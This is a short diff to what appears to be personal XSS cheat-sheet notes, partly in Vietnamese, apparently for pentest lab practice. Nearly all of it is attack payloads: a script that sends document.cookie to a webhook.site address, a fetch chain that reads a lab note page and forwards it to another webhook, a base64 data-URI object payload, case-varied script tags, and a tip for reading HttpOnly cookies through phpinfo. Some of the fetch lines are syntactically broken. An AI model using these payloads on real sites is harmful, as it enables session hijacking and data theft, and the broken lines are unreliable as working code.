@@ -1,8 +1,16 @@
 .html .svg .swf  FILE exec js
 https://tsublogs.wordpress.com/2017/04/26/pentest-qa-cung-tsu-3-xss-upload-style/
+
+document.cookie k the nam tren url
+http-only flag is on, you can’t steal cookie, but you can get it from phpinfo!
+
+<script> new Image().src="https://webhook.site/43135504-ab95-4e9c-9283-8b5e05482863/"+document.cookie;</script>
+<scRIpt>alert(1)</scRIpt>
 <h1>kaka</h1>
 alert(origin);
 "><script>alert(1);</script>
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgyKTwvc2NyaXB0Pg==">
 
 script<script>fetch('https://webhook.site/fa3e73c6-2eb7-4297-9907-eda3b9dcdebb/'+fetch(https://note4.cyberjutsu-lab.tech/note).then(function (response) {return response.text())</script>
 script<script>alert(fetch(https%253a//note4.cyberjutsu-lab.tech/note).then(function%2b(response)%2b{return%2bresponse.text()})</script>
